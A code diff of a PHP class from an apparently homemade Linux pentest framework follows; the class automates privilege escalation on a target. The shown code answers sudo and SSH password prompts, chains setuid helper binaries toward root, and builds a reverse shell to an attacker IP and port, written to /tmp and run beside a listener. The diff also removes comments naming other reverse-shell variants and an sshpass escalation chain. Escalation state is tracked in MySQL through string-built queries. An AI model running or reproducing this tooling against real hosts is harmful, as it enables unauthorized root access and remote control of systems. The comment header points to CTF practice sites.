@@ -1,5 +1,21 @@
 <?php
 
+
+/*
+ https://hackingresources.com/category/ctf-writeups/vulnhub-writeups/
+ https://hackso.me/
+ https://emaragkos.gr/recommended-machines/
+ http://overthewire.org/wargames/
+ https://www.hackingarticles.in/ctf-challenges-walkthrough/
+ https://pentest.training/virtualmachines.php
+ http://captf.com/practice-ctf/
+ https://practicalpentestlabs.com/
+ https://www.virtualhackinglabs.com/
+ vulnhub writeups
+ 
+ https://github.com/initstring/uptux
+ */
+
 class lan4linux extends LAN{
     var $lan2where ;
     var $templateB64_id ;
@@ -9,7 +25,7 @@ class lan4linux extends LAN{
     var $template_shell ;
     var $templateB64_shell ;
     
-    var $id ;
+    var $id8str ;
     var $id8b64 ;
     var $uid ;
     var $uid_name;
@@ -24,33 +40,15 @@ class lan4linux extends LAN{
     var $etc_passwd_str ;
     var $shell_version ;
 
-    
-    
-    
-    
-    /*
-     https://hackingresources.com/category/ctf-writeups/vulnhub-writeups/
-     https://hackso.me/
-     https://emaragkos.gr/recommended-machines/
-     http://overthewire.org/wargames/
-     https://www.hackingarticles.in/ctf-challenges-walkthrough/
-     https://pentest.training/virtualmachines.php
-     http://captf.com/practice-ctf/
-     https://practicalpentestlabs.com/
-     https://www.virtualhackinglabs.com/     
-     vulnhub writeups
-     
-     https://github.com/initstring/uptux
-     */
 
     public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
         parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
-        //$uid,$uid_name,$gid,$gid_name,$context
-        $rst_id = base64_decode($id8b64);
-        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
         
-        $this->id = $id;
-        $this->id8b64 = trim($id8b64);
+        $rst_id = base64_decode($id8b64);
+        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $this->parse4id($rst_id);
+        
+        $this->id8str = $id8str;
+        $this->id8b64 = base64_encode($id8str);
         $this->uid = trim($uid);
         $this->uid_name = trim($uid_name);
         $this->gid = trim($gid);
@@ -71,7 +69,17 @@ class lan4linux extends LAN{
         
         if ($this->context !== "listening_Server" ){
             $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
-        if (!$this->checkBD($sql_r)) {
+            if ($this->checkBD($sql_r)) {
+                if ($this->lan2check4id8db($this->port2id,$this->templateB64_id,$this->id8b64)!==FALSE){
+                    $chaine = "Escalation Already Done for $this->uid_name";
+                    $this->article($this->uid_name, $this->id8str);
+                    $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,$this->uid_name,$this->id8str);
+                    $this->rouge("out from ".__FUNCTION__);$this->pause();
+                    exit() ;  
+                }
+            }
+        
+        else {
             $sql_w = "INSERT INTO LAN (id8port,uid_name,templateB64_id,templateB64_cmd,templateB64_shell,uid,gid,gid_name,context,id8b64) VALUES ('$this->port2id','$this->uid_name','$this->templateB64_id','$this->templateB64_cmd','$this->templateB64_shell','$this->uid','$this->gid','$this->gid_name','$this->context','$this->id8b64'); ";
             echo "$sql_w\n";
             $this->mysql_ressource->query($sql_w);
@@ -79,6 +87,8 @@ class lan4linux extends LAN{
             echo $this->rouge("Working on LAN for the first time");
             
         }
+
+        
         }
          
 
@@ -339,7 +349,6 @@ This can also be used to determine local IPs, as well as gain a better understan
     }
     
     public function lan2pentest8id($template_id_euid){
-        // echo id | sshpass -p 'password' ssh user@10.60.10.131 -p 22 -C  "/tmp/seteuid_user_user2_bash \"/tmp/seteuid_user2_user3_bash \\\"/tmp/seteuid_user3_root_bash \"/bin/bash\" \\\" \" "
         
         $this->titre(__FUNCTION__);
         $attacker_ip = $this->ip4addr4target($this->ip);
@@ -361,12 +370,16 @@ This can also be used to determine local IPs, as well as gain a better understan
         $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout*3);
         //var_dump($rst_id);
         
-        while (strstr($rst_id, "s password:")!==FALSE){
+
+        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE){
             $chaine = "Asking Password";
             $this->rouge($chaine);
-            $data = "\n";
+            $data = "";
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+            
         }
+        
+        
         
         list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
         
@@ -392,7 +405,7 @@ This can also be used to determine local IPs, as well as gain a better understan
                 $obj_lan_root1->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                 
             }
-            if (!empty($euid_name)){
+            if (!empty($euid_name) && $this->uid_name !==$euid_name){
                 $this->rouge("try to spawn $euid_name ");$this->pause();
                 
                 $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);$this->pause();
@@ -403,16 +416,20 @@ This can also be used to determine local IPs, as well as gain a better understan
                 list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
                 $id8b64 = base64_encode($id8str);
                 
-                $templateB64_id_check = base64_encode($id8b64);
-                if ($this->lan2check4id8db($this->port2idt, $templateB64_id_check, $id8b64)){
-                    $chaine = "Escalation already done";
-                    $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
+                $templateB64_id_check = base64_encode($template_id_new);
+                if ($this->lan2check4id8db($this->port2id, $templateB64_id_check, $id8b64)){
+                    $this->rouge($id8str);
+                    $chaine = "Escalation Already Done for this $uid_name and ID";
+                    $this->article($uid_name, $id8str);
+                    $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,$uid_name,$id8str);
                     $this->rouge("out from ".__FUNCTION__);$this->pause();
+                    
                     return 0 ;
                 }
                 else {
-                    $chaine = "Escalation launching again";
-                    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
+                    $chaine = "Escalation for the first time for this $uid_name and ID";
+                    $this->article($uid_name, $id8str);
+                    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,$uid_name,$id8str);
                     $this->pause();
                 }
                     
@@ -422,14 +439,17 @@ This can also be used to determine local IPs, as well as gain a better understan
                 
                 $template_cmd2 = str_replace("%SHELL%",$template_id,$this->template_shell);
                 $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
+                $template_shell = str_replace("%CMD%","%SHELL%",$template_cmd);
+                $templateB64_shell = base64_encode($template_shell);
                 
                 
                 $templateB64_cmd = base64_encode($template_cmd);
-                
+                $template_id = "%ID%";
+                $templateB64_id = base64_encode($template_id);
                 $this->article("OLD Template ID", $this->template_id);
                 $this->article("OLD Template CMD", $this->template_cmd);
 
-                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
+                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
                 $obj_lan_root->poc($this->flag_poc);
 
                 $this->pause();
@@ -455,7 +475,7 @@ This can also be used to determine local IPs, as well as gain a better understan
                 else {
                     
                     $this->log2succes("$obj_lan_root->uid_name is not root checking again",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-                    $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
+                    $obj_lan_root->lan2check8id($attacker_ip, $attacker_port, $shell);$this->pause();
                 }
                 
             }
@@ -999,7 +1019,7 @@ EOC;
 
 
     public function lan2check4id8db($id8port,$templateB64_id,$id8b64):bool{
-        $sql_w = "SELECT id8port,templateB64_id,id8b64 FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
+        $sql_w = "SELECT templateB64_id FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
         echo "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"SELECT EXISTS($sql_w);\"  2>/dev/null \n";
         return $this->checkBD($sql_w);
     }
@@ -1012,21 +1032,12 @@ public function lan2check8id($attacker_ip, $attacker_port, $shell){
     $this->requette($query);
     $this->pause();
     
-
     $cmd_nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
-    //s$cmd_nc = $this->rev8exec($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8perl($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8node($attacker_ip, $attacker_port, $shell);
-    //$cmd_nc = $this->rev8php($attacker_ip, $attacker_port, $shell)
+    
     $cmd_nc = addcslashes($cmd_nc,'"');
-    //$cmd_nc = addcslashes($cmd_nc,'$');
-    //$cmd_nc = $this->rev8python3($attacker_ip, $attacker_port, $shell);
+
     $lprotocol = "T";
-    //$cmd_remote = str_replace("%ID%", $cmd_nc, $this->template_id);
-    //$cmd1 = str_replace("%CMD%",$cmd_nc,$this->template_cmd);
+
     $this->article("TEMPLATE ID",$this->template_id);
     $hash_cmd_rev = sha1($cmd_nc);
     //$data = "echo \"$cmd_nc\" > /tmp/$hash_cmd_rev.sh";
@@ -1041,30 +1052,13 @@ public function lan2check8id($attacker_ip, $attacker_port, $shell){
     $cmd2 = str_replace("%CMD%","/tmp/$hash_cmd_rev.sh",$this->template_cmd);
     $this->article("TEMPLATE CMD", $this->template_cmd);
     
- 
- 
-    
     $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $lprotocol $this->templateB64_cmd $this->templateB64_shell server 60 listening_Server\" ";
-    $cmd2 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
+    //$cmd2 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
     $cmd3 = str_replace("%SHELL%","/tmp/$hash_cmd_rev.sh",$this->template_shell);
     
     $this->exec_parallel($cmd1, $cmd3, $this->stream_timeout);
-    /*
-    return 0;
-    
-    $query1 = "xterm -T '$cmd1' -e '$cmd1' 2> /dev/null ";
 
     
-    $pid = pcntl_fork ();
-    if ($pid) {
-        echo "\t\033[36;40;1;1m 1:\033[0m \033[37;40;1;1m $query1 \033[0m\n";
-        system ( $query1 );
-    } else {
-        sleep ( 5 );
-        echo "\t\033[36;40;1;1m 2:\033[0m \033[37;40;1;1m $cmd2 \033[0m\n";
-        $this->stream4result($this->stream,$cmd2, $this->stream_timeout*5);
-    }
-    */
     $this->pause();
 }
 
